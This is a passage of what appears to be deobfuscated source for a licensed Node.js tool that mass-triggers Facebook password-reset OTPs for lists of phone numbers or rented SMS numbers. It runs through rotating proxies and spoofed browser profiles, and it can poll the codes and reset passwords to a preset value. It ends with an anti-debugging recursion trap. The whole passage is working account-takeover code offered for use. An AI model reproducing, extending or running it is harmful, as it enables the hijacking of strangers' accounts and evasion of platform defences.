  if (v1842 === "none") return proxyManager.clear(), console.log(B("  ✓ Direct connection selected — no proxy will be used.")), await sleep(0x320), "none";
  if (v1842 === "single") {
    process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("ENTER PROXY") + '\x0a'), console.log("   " + chalk.hex("#888888")("Formats: ip:port:user:pass / socks5://user:pass@ip:port")), console.log("   " + chalk.hex("#888888")("         host:port@user:pass / http://user:pass@ip:port") + '\x0a');
    const v1843 = await promptText("Proxy string (or type 'back'):", '');
    if (v1843.toLowerCase() === "back") return "back";
    v1843 && (proxyManager.load(v1843), dbg("Single proxy loaded: " + proxyManager.proxies.length + " proxy"));
  } else {
    if (v1842 === "file_default" || v1842 === "file_custom") {
      let v1844 = "proxies.txt";
      if (v1842 === "file_custom") {
        process.stdout.write("[2J[H"), printHeader(), console.log("   " + chalk.hex("#FCAF45").bold("ENTER PROXY FILE") + '\x0a'), v1844 = await promptText("Proxy file path (or type 'back'):", "proxies.txt");
        if (v1844.toLowerCase() === "back") return "back";
      }
      const v1845 = path.resolve(v1844);
      fs.existsSync(v1845) ? (proxyManager.load(v1845), dbg("Proxy file loaded: " + proxyManager.proxies.length + " proxies")) : (fs.writeFileSync(v1845, ''), console.log(R("  [!] Created empty proxy file: " + v1844 + ". Running direct.")), await sleep(0x5dc));
    }
  }
  return v1842;
}
async function selectRetryCount() {
  const v1846 = {};
  v1846.name = "0 Retries  (Process once, no retries)", v1846.value = 0x0;
  const v1847 = {};
  v1847.name = "1 Retry    (Retry wrong OTP / timeout 1 time)", v1847.value = 0x1;
  const v1848 = {};
  v1848.name = "2 Retries  (Retry wrong OTP / timeout 2 times)", v1848.value = 0x2;
  const v1849 = {};
  v1849.name = "3 Retries  (Recommended - 3 times)", v1849.value = 0x3;
  const v1850 = {};
  v1850.name = "5 Retries  (Maximum effort - 5 times)", v1850.value = 0x5;
  const v1851 = {};
  v1851.name = "✏️  Custom   (enter manually)", v1851.value = "custom";
  const v1852 = {};
  v1852.name = "⬅️ Go Back to Proxy Selection", v1852.value = "back";
  const v1853 = [v1846, v1847, v1848, v1849, v1850, v1851, v1852],
    v1854 = await selectOption("RETRY SETTINGS (Wrong OTP & Timeouts)", v1853);
  if (v1854 === "back") return "back";
  if (v1854 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1855 = await promptText("Enter retry count for wrong OTP / timeouts (0-10) [or type 'back']:", '3');
    if (v1855.toLowerCase() === "back") return "back";
    return Math.max(0x0, Math.min(0xa, parseInt(v1855) || 0x0));
  }
  return v1854;
}
async function selectResendCount() {
  const v1856 = {};
  v1856.name = "0 Resends  (Send initial OTP once - Default)", v1856.value = 0x0;
  const v1857 = {};
  v1857.name = "✏️  Custom   (enter manually)", v1857.value = "custom";
  const v1858 = {};
  v1858.name = "⬅️ Go Back to Proxy Selection", v1858.value = "back";
  const v1859 = [v1856, v1857, v1858],
    v1860 = await selectOption("SELECT OTP RESEND COUNT", v1859);
  if (v1860 === "back") return "back";
  if (v1860 === "custom") {
    process.stdout.write("[2J[H"), printHeader();
    const v1861 = await promptText("Enter number of OTP resends per number (0-5) [or type 'back']:", '0');
    if (v1861.toLowerCase() === "back") return "back";
    return Math.max(0x0, Math.min(0x5, parseInt(v1861) || 0x0));
  }
  return v1860;
}
async function main() {
  syncUAAndHost();
  const v1862 = process.env.SKING_UI === '1';
  !v1862 && process.stdout.write("[2J[3J[H");
  const v1863 = process.argv.slice(0x2).filter(v1873 => !v1873.startsWith('--'));
  let v1864,
    v1865 = 0xf,
    v1866,
    v1867 = null,
    v1868 = null,
    v1869 = null,
    v1870 = null,
    v1871 = 0x0;
  if (v1863.length >= 0x1 && fs.existsSync(v1863[0x0])) {
    v1864 = v1863[0x0], v1865 = parseInt(v1863[0x1]) || 0x32, v1866 = v1863[0x0];
    v1863[0x3] && v1863[0x3].trim() && (proxyManager.load(v1863[0x3]), dbg("Proxy set: " + proxyManager.proxies.length + " proxies loaded"));
    v1863[0x5] && v1863[0x5].trim() && setSelectedBrowsers(v1863[0x5].trim());
    const v1874 = await validateLicense();
    !v1874 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
  } else {
    const v1875 = await validateLicense();
    !v1875 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
    await sleep(0x5dc);
    const v1876 = setInterval(() => {}, 0x2710);
    try {
      let v1877 = 0x1;
      while (true) {
        if (v1877 === 0x1) {
          const v1878 = await pickNumbersSource();
          if (v1878 && v1878.back) continue;
          v1864 = v1878.numbersFile, v1867 = v1878.nexaConfig, v1868 = v1878.twoOoConfig || null, v1869 = v1878.smsBowerConfig || null, v1870 = v1878.zenexConfig || null, v1877 = 0x2;
        } else {
          if (v1877 === 0x2) {
            const v1879 = await selectThreadCount();
            if (v1879 === "back") {
              v1877 = 0x1;
              continue;
            }
            v1865 = v1879, v1877 = 0x3;
          } else {
            if (v1877 === 0x3) {
              const v1880 = await selectFacebookUrl();
              if (v1880 === "back") {
                v1877 = 0x2;
                continue;
              }
              SELECTED_LANG = v1880, FB_HOST = SELECTED_LANG === "random" ? "www.facebook.com" : SELECTED_LANG, v1877 = 0x4;
            } else {
              if (v1877 === 0x4) {
                const v1881 = await selectAcceptLanguage();
                if (v1881 === "back") {
                  v1877 = 0x3;
                  continue;
                }
                SELECTED_ACCEPT_LANG = v1881, v1877 = 0x5;
              } else {
                if (v1877 === 0x5) {
                  const v1882 = await selectBrowserProfile();
                  if (v1882 === "back") {
                    v1877 = 0x4;
                    continue;
                  }
                  setSelectedBrowsers(v1882), syncUAAndHost(FB_HOST), v1877 = 0x6;
                } else {
                  if (v1877 === 0x6) {
                    const v1883 = await selectProxySetup();
                    if (v1883 === "back") {
                      v1877 = 0x5;
                      continue;
                    }
                    if (proxyManager.hasProxies) {
                      const v1884 = await selectProxyCheckOption();
                      if (v1884 === "back") {
                        v1877 = 0x6;
                        continue;
                      }
                    }
                    v1877 = 0x7;
                  } else {
                    if (v1877 === 0x7) {
                      const v1885 = await selectResendCount();
                      if (v1885 === "back") {
                        v1877 = 0x6;
                        continue;
                      }
                      v1871 = v1885, v1877 = 0x8;
                    } else {
                      if (v1877 === 0x8) {
                        const v1886 = !!(v1868 || v1869 || v1870);
                        if (v1886) {
                          const v1887 = v1868 ? v1868.provider === "voltx" ? "Voltx" : "Stex" : v1869 ? "SMS Bower" : "Zenex",
                            v1888 = {};
                          v1888.name = "Yes - Poll OTP & change password automatically", v1888.value = "yes";
                          const v1889 = {};
                          v1889.name = "No - Just trigger OTP, save to otp_sent.txt", v1889.value = 'no';
                          const v1890 = {};
                          v1890.name = "Go Back to Resend Count", v1890.value = "back";
                          const v1891 = await selectOption("AUTO CONFIRM OTP after Reset? [" + v1887 + ']', [v1888, v1889, v1890]);
                          if (v1891 === "back") {
                            v1877 = 0x7;
                            continue;
                          }
                          if (v1891 === "yes") {
                            const v1892 = await promptText("New password for confirmed accounts [default: Password@2026]:", "Password@2026");
                            if (v1892.toLowerCase() === "back") continue;
                            const v1893 = v1892 || "Password@2026";
                            if (v1868) {
                              const v1894 = v1868.provider === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/success-otp" : "/MXS47FLFX0U/tness/@public/api/success-otp";
                              v1868.autoConfirm = true, v1868.otpPath = v1894, v1868.newPassword = v1893;
                            } else {
                              if (v1869) v1869.autoConfirm = true, v1869.newPassword = v1893;else v1870 && (v1870.autoConfirm = true, v1870.newPassword = v1893);
                            }
                          } else {
                            if (v1868) v1868.autoConfirm = false;
                            if (v1869) v1869.autoConfirm = false;
                            if (v1870) v1870.autoConfirm = false;
                          }
                        }
                        v1877 = 0x9;
                      } else {
                        if (v1877 === 0x9) {
                          const v1895 = await selectOption("Confirm: File=" + v1864 + ", Threads=" + v1865 + ", Browser=" + SELECTED_BROWSER + ", Resends=" + v1871, [{
                            'name': "LAUNCH",
                            'value': true
                          }, {
                            'name': "Go Back",
                            'value': "back"
                          }]);
                          if (v1895 === "back") {
                            v1877 = v1868 || v1869 || v1870 ? 0x8 : 0x7;
                            continue;
                          }
                          !v1895 && (console.log(R("\n  [!] Launch cancelled. Exiting...\n")), process.exit(0x0));
                          v1866 = v1864, process.stdin.pause();
                          break;
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    } finally {
      clearInterval(v1876);
    }
  }
  let v1872 = true;
  while (v1872) {
    let v1896 = [];
    if (!v1867 && !v1868 && !v1869 && !v1870) {
      v1896 = loadNumbers(v1864);
      if (v1896.length === 0x0) {
        console.log(''), console.log(R("  ✗ No valid phone numbers found in: " + v1864)), console.log(Y("    Make sure the file contains numbers (one per line, 7-15 digits).\n"));
        const v1906 = {};
        v1906.name = "🔄 Go Home (Restart — pick a different file)", v1906.value = "home";
        const v1907 = {};
        v1907.name = "❌ Exit", v1907.value = "exit";
        const v1908 = await selectOption("What would you like to do?", [v1906, v1907]);
        if (v1908 === "home") {
          const v1909 = await pickNumbersSource();
          if (v1909 && !v1909.back) {
            {
              v1864 = v1909.numbersFile;
              v1867 = v1909.nexaConfig;
              v1868 = v1909.twoOoConfig || null;
              v1869 = v1909.smsBowerConfig || null;
              v1870 = v1909.zenexConfig || null;
            }
          }
          continue;
        } else process.exit(0x0);
      }
      if (proxyManager.hasProxies) {
        if (SKIP_PROXY_CHECK) console.log(B("\n  ⚡ Skipping proxy connectivity check — starting immediately!\n"));else {
          dbg("PROXY STATUS: " + proxyManager.proxies.length + " proxies loaded, testing connectivity...");
          const v1910 = await proxyManager.testConnectivity();
          if (!v1910) {
            const v1911 = await ask(Y("  [!] Proxy failed. Continue without proxy? (y/N): "));
            v1911.toLowerCase() !== 'y' && (console.log(G("\n  Aborted.\n")), process.exit(0x0)), dbg("USER CHOSE TO CLEAR PROXIES"), proxyManager.proxies = [];
          }
        }
      } else dbg("PROXY STATUS: No proxies loaded, using direct connection");
    }
    await sleep(0x3e8);
    const v1897 = await runPool(v1896, v1865, null, v1866, v1867, v1871, 0x3, v1868, v1869, v1870),
      v1898 = path.join(__dirname, "results"),
      v1899 = path.join(v1898, "otp_sent.txt"),
      v1900 = path.join(v1898, "checkpoint.txt"),
      v1901 = path.join(__dirname, "succesfull.txt");
    if (v1897.success.length > 0x0) {
      const v1912 = {};
      v1912.recursive = true;
      if (!fs.existsSync(v1898)) fs.mkdirSync(v1898, v1912);
      const v1913 = v1897.success.map(v1916 => v1916.split(" | ")[0x0].trim());
      fs.writeFileSync(v1899, v1913.join('\x0a') + '\x0a');
      const v1914 = new Date().toLocaleString(),
        v1915 = "\n=== Run: " + v1914 + " | Browser: " + SELECTED_BROWSER + " ===\n";
      fs.appendFileSync(v1901, v1915 + v1897.success.join('\x0a') + '\x0a');
    }
    if (v1897.captcha && v1897.captcha.length > 0x0) {
      const v1917 = {};
      v1917.recursive = true;
      if (!fs.existsSync(v1898)) fs.mkdirSync(v1898, v1917);
      fs.appendFileSync(v1900, v1897.captcha.join('\x0a') + '\x0a');
    }
    console.log(''), console.log(B("  ╔════════════════════════════════════════════╗")), console.log(B("  ║") + W.bold("  V6 API OTP — COMPLETE                     ") + B('║')), console.log(B("  ╠════════════════════════════════════════════╣")), console.log(B("  ║") + ('\x20\x20' + chalk.greenBright("OTP Sent") + "     " + chalk.greenBright(String(v1897.success.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + G("No Account") + "   " + G(String(v1897.noAccount.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + Y("No SMS") + "       " + Y(String(v1897.noSms.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + R("Errors") + "       " + R(String(v1897.errors.length).padStart(0x6))) + "                  " + B('║')), console.log(B("  ║") + ('\x20\x20' + C("Data Used") + "    " + C((dataMB() + " MB").padEnd(0x14))) + "    " + B('║'));
    proxyManager.hasProxies && console.log(B("  ║") + ('\x20\x20' + C("Proxy") + "        " + C(proxyManager.getStatus().padEnd(0x14))) + "    " + B('║'));
    console.log(B("  ╚════════════════════════════════════════════╝\n"));
    const v1902 = {};
    v1902.name = "Reuse successful numbers (" + v1899 + ')', v1902.value = "reuse";
    const v1903 = {};
    v1903.name = "Go Home (Restart)", v1903.value = "home";
    const v1904 = {};
    v1904.name = "Exit", v1904.value = "exit";
    const v1905 = await selectOption("Processing Complete. What next?", [v1902, v1903, v1904]);
    if (v1905 === "reuse") {
      if (fs.existsSync(v1899)) {
        let v1918 = fs.readFileSync(v1899, "utf8").split('\x0a').map(v1919 => v1919.trim()).filter(v1920 => v1920.length > 0x5);
        fs.writeFileSync(v1864, v1918.join('\x0a')), fs.writeFileSync(v1899, ''), console.log("\n  [32m✓ Copied " + v1918.length + " successful numbers to " + v1864 + " and cleared " + v1899 + ".[0m\n");
      } else console.log("\n  [31m✗ No successful numbers found.[0m\n"), v1872 = false;
    } else {
      if (v1905 === "home") {
        const v1921 = setInterval(() => {}, 0x2710);
        try {
          const v1922 = await pickNumbersSource();
          v1864 = v1922.numbersFile, v1867 = v1922.nexaConfig, v1868 = v1922.twoOoConfig || null, v1869 = v1922.smsBowerConfig || null, v1870 = v1922.zenexConfig || null, v1865 = await selectThreadCount(), SELECTED_LANG = await selectFacebookUrl(), FB_HOST = SELECTED_LANG === "random" ? "www.facebook.com" : SELECTED_LANG, SELECTED_ACCEPT_LANG = await selectAcceptLanguage(), SELECTED_BROWSER = await selectBrowserProfile(), syncUAAndHost(FB_HOST), await selectProxySetup();
          const v1923 = await promptText("Enter number of OTP resends per number [default: 0]:", '0');
          v1871 = parseInt(v1923) || 0x0, v1866 = v1864;
        } finally {
          clearInterval(v1921);
        }
      } else v1872 = false;
    }
  }
}
const v120 = {};
v120.seedSession = seedSession, v120.proxyManager = proxyManager, v120.searchAccount = searchAccount, v120.selectAccount = selectAccount, v120.getInitiateView = getInitiateView, v120.conversationalSupportQuery = conversationalSupportQuery, v120.sendOTP = sendOTP, v120.graphqlPost = graphqlPost, v120.buildParams = buildParams, v120.buildHeaders = buildHeaders, v120.mergeCookies = mergeCookies, v120.parseResp = parseResp, v120.getRandomClient = getRandomClient, v120.getSimOperators = getSimOperators, v120.detectCountry = detectCountry, v120.getPhoneLang = getPhoneLang, v120.resolveTimezone = resolveTimezone, v120.withHardTimeout = withHardTimeout, v120.isProxyLevelError = isProxyLevelError, v120.SELECTED_BROWSER = SELECTED_BROWSER, v120.proxyHttpsRequest = proxyHttpsRequest, v120.httpsGetPage = httpsGetPage, v120.httpsGetPageWithRedirects = httpsGetPageWithRedirects, v120.getPhoneCountry = getPhoneCountry, v120.getProxyCountry = getProxyCountry, v120.selectOption = selectOption, v120.promptText = promptText, v120.printHeader = printHeader, v120.validateLicense = validateLicense, v120.sleep = sleep, v120.uuid = uuid, v120.dbg = dbg, v120.cdbg = cdbg, module.exports = v120;
(require.main === module || !module.parent || require.main && require.main.filename === module.filename) && main().catch(v1924 => {
  try {
    fs.appendFileSync(path.join(__dirname, "fatal_error.log"), '[' + new Date().toISOString() + ']\x20' + (v1924.stack || v1924) + '\x0a');
  } catch (v1925) {}
  console.log(R("\n  [!] Fatal: " + v1924.message + '\x0a'));
  process.exit(0x1);
});
function fn2(v1926) {
  function fn31(v1927) {
    fn31(++v1927);
  }
  try {
    if (v1926) return fn31;else fn31(0x0);
  } catch (v1928) {}
}